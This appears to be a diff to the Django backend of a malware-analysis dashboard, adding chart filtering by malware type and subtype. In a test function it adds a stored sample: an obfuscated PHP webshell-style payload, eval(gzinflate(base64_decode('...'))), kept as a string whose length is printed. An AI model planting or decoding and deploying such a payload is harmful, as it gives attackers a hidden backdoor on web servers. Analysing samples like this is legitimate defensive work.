@@ -16,14 +16,15 @@ import networkx as nx
 # import matplotlib.pyplot as plt
 # 13903 373668
 def test(request):
-    cursor = connection.cursor()
-    cursor.execute("select uuid, file_md5, `name`, `caller`, argc, argv, `return`, `index`, dynamic "
-                   "from malware_op_code where uuid = '{0}' and file_md5 = '{1}' and `name` = '{2}' and `index` = '1867'".format(
-        'd50bcde781a14ae1db088cebad732476', 'd5e9ad5b40d06e2c5208b6e20ca7b809', 'strlen'))
-    desc = cursor.description
-    all_data = cursor.fetchall()
-    ecs_force_and_file = [dict(zip([col[0] for col in desc], row)) for row in all_data]
-    print(ecs_force_and_file)
+    ddd = """{"value": [[0, "source_string", "eval(gzinflate(base64_decode('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"]]}"""
+    print(len(ddd))
+    # cursor.execute("select uuid, file_md5, `name`, `caller`, argc, argv, `return`, `index`, dynamic "
+    #                "from malware_op_code where uuid = '{0}' and file_md5 = '{1}' and `name` = '{2}' and `index` = '1867'".format(
+    #     'd50bcde781a14ae1db088cebad732476', 'd5e9ad5b40d06e2c5208b6e20ca7b809', 'strlen'))
+    # desc = cursor.description
+    # all_data = cursor.fetchall()
+    # ecs_force_and_file = [dict(zip([col[0] for col in desc], row)) for row in all_data]
+    # print(ecs_force_and_file)
     # name = ['uuid', 'file_md5', 'name', 'caller', 'argc', 'argv', 'return', 'index', 'dynamic']
     # test = pd.DataFrame(columns=name, data=ecs_force_and_file)
     # test.to_csv('./file_opcode_with_dynamic_11869.csv', index=0)
@@ -79,13 +80,13 @@ def get_time_line_chart(request):
 
     # 文件过滤为空的逻辑，以确定where_str
     # file_filter = {
-    #     'malwareType': [],
-    #     'malwareSubtype': [],
-    #     'fileType': []
+    #     'malwareType': ['网站后门', '恶意进程'],
+    #     'malwareSubtype': ['WEBSHELL', '木马程序'],
+    #     'fileType': ['WEBSHELL', 'BIN']
     # }
     #
-    # line_type = 'MalwareType'
-    # time_type = '1 month'
+    # line_type = 'MalwareSubType'
+    # time_type = '7 days'
 
     has_filter = has_filter_func(file_filter)
 
@@ -139,8 +140,12 @@ def get_time_line_chart(request):
         force_value = [dict(zip([col[0] for col in desc], row)) for row in all_data]
         force_value = sorted(force_value, key=lambda value: value['time'])
 
+        if has_filter:
+            malware_type = file_filter['malwareType']
+        else:
+            malware_type = ['网站后门', '恶意进程', '恶意脚本']
+
         # 处理为接口格式
-        malware_type = ['网站后门', '恶意进程', '恶意脚本']
         for i in range(len(malware_type)):
             Data.append({
                 'graphName': malware_type[i],
@@ -178,20 +183,26 @@ def get_time_line_chart(request):
         force_value = [dict(zip([col[0] for col in desc], row)) for row in all_data]
         force_value = sorted(force_value, key=lambda value: value['time'])
 
+        if has_filter:
+            malware_sub_type = file_filter['malwareSubtype']
+        else:
+            malware_sub_type = MALWARE_SUBTYPE
+
         # 处理为接口格式
-        for i in range(len(MALWARE_SUBTYPE)):
+        for i in range(len(malware_sub_type)):
             Data.append({
-                'graphName': MALWARE_SUBTYPE[i],
+                'graphName': malware_sub_type[i],
                 'graphData': []
             })
 
         for f in force_value:
             if f['time'] != '0000-00-00 00:00:00':
-                for i in range(len(MALWARE_SUBTYPE)):
+                for i in range(len(malware_sub_type)):
                     Data[i]['graphData'].append({
                         'time': f['time'],
-                        'val': int(f[MALWARE_SUBTYPE[i]])
+                        'val': int(f[malware_sub_type[i]])
                     })
+
     return HttpResponse(json.dumps(Data), content_type='application/json')
 
 
